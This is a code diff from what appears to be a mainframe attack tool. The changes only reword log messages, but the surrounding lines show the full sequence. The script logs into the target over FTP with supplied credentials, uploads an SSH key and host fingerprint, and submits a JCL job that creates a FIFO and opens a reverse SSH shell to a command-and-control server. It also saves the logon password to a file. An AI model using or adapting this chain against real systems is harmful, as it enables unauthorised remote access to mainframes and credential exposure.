@@ -82,7 +82,7 @@ if __name__ == '__main__':
     ssh = ssh_utils
 
     # SSH host fingerprint for the CC server
-    logging.info('Auto-detecting the ssh server fingerprint')
+    logging.info('Auto-detect CC ssh server fingerprint')
     autodetect_host_key = False
     try:
         cc_server_fingerprint = config['cc_server_fingerprint'].encode()
@@ -104,7 +104,7 @@ if __name__ == '__main__':
         authorized_key = config['authorized_key']
         logging.info('SSH keys loaded from configuration file')
     except KeyError:
-        logging.info('Generating SSH keys')
+        logging.info('Generate SSH keys')
         # Generate key (k) and public key (p)
         key, pubkey = ssh.gen_rsa_key(config['keybits'])
         # Output the ssh known_host value
@@ -116,32 +116,32 @@ if __name__ == '__main__':
 
 
     # Open FTP connection
-    logging.info('Opening FTP connection to the target at %s', config['hostname'])
+    logging.info('Open FTP connection to %s', config['hostname'])
     ftp = FTP(config['hostname'], config['username'], config['password'])
     ftp.connect()
 
     # Set the temporary filenames for the key, FIFO and known hosts
     # Technically vulnerable to a time of check vs time of use, but makes the
     # code easier to read
-    logging.info('Generating temporary files for the shell')
+    logging.info('Generate temporary files on the target')
     ftpkeyname = ftp.gen_random_filename(path=config['temporary_path'])
     ftpfifoname = ftp.gen_random_filename(path=config['temporary_path'])
     ftpknownhosts = ftp.gen_random_filename(path=config['temporary_path'])
 
     # Save the key on the target
-    logging.info('Uploading the SSH key on the target')
+    logging.info('Upload SSH key on the target')
     ftp.upload_string_as_file(key, ftpkeyname)
 
     # Save the known host file on the target
-    logging.info('Uploading the host fingerprint on the target')
+    logging.info('Upload host fingerprint on the target')
     ftp.upload_string_as_file(cc_server_fingerprint, ftpknownhosts)
 
     # Create the FIFO for the shell
-    logging.info('Creating the FIFO for the shell')
+    logging.info('Create FIFO on the target')
     mkfifo_step = Template(MKFIFO).substitute(FIFONAME=ftpfifoname)
 
     # Generate the JCL to start the SSH tunnel
-    logging.info('Running the reverse SSH command')
+    logging.info('Render reverse SSH command to JCL')
     testpath = ''
     if args.test:
         ssh_command = REVERSE_SH_SSH_TO_FILE
@@ -163,10 +163,11 @@ if __name__ == '__main__':
     JCL.add_inline(mkfifo_step)
     JCL.add_inline(ssh_step)
     # Submit the job
+    logging.info('Submit job card to the mainframe')
     ftp.run_jcl(JCL.render())
 
     # Update the config object to pass it to the shell
-    logging.info('Shell preparation')
+    logging.info('Configure shell handler')
     config['cc_server_fingerprint'] = cc_server_fingerprint.decode()
     config['key'] = key.decode()
     config['authorized_key'] = authorized_key
@@ -189,7 +190,7 @@ if __name__ == '__main__':
 
     # Save the config for future use
     if args.savestate is not None:
-        logging.info('Saving the output configuration file')
+        logging.info('Saving state to configuration file')
         logging.warning('Saving the logon password to the file! You can remove it if you want ;)')
         with open(args.savestate, 'w') as configfile:
             global_config.write(configfile)
